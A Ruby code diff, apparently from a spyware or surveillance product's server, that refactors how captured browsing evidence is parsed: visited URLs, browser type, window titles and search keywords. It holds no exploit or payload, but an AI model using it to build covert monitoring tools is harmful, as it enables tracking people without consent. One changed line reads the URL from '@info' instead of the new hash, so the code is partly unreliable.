@@ -58,7 +58,7 @@ module UrlEvidence
 
       delim = stream.read(4).unpack("L").first
       raise EvidenceDeserializeError.new("Malformed evidence (invalid URL version)") unless delim == VERSION_DELIMITER
-
+      
       url = stream.read_utf16le_string
       info[:data][:url] = url.utf16le_to_utf8 unless url.nil?
       browser = stream.read(4).unpack("L").first
@@ -66,11 +66,12 @@ module UrlEvidence
       window = stream.read_utf16le_string
       info[:data][:title] = window.utf16le_to_utf8 unless window.nil?
       info[:data][:keywords] = decode_query info[:data][:url]
-
+      
       delim = stream.read(4).unpack("L").first
       raise EvidenceDeserializeError.new("Malformed URL (missing delimiter)") unless delim == ELEM_DELIMITER
 
       yield info if block_given?
+      :delete_raw
     end
   end
 
@@ -111,17 +112,22 @@ module UrlcaptureEvidence
     version, browser, url_len, window_len = binary.read(16).unpack("I*")
     raise EvidenceDeserializeError.new("invalid log version for URLCAPTURE") unless version == URL_VERSION
 
-    @info[:data][:browser] = BROWSER_TYPE[browser]
-    @info[:data][:url] = binary.read(url_len).utf16le_to_utf8
-    @info[:data][:title] = binary.read(window_len).utf16le_to_utf8
-    @info[:data][:keywords] = decode_query @info[:data][:url]
+    ret = Hash.new
+    ret[:data] = Hash.new
+    ret[:data][:browser] = BROWSER_TYPE[browser]
+    ret[:data][:url] = binary.read(url_len).utf16le_to_utf8
+    ret[:data][:title] = binary.read(window_len).utf16le_to_utf8
+    ret[:data][:keywords] = decode_query @info[:data][:url]
+    return ret
   end
 
-  def decode_content
-    @info[:grid_content] = @info[:chunks].first
-    return [self]
+  def decode_content(common_info, chunks)
+    info = Hash[common_info]
+    info[:data] ||= Hash.new
+    info[:grid_content] = chunks.join
+    yield info if block_given?
+    :delete_raw
   end
 end
-
 
 end # ::RCS
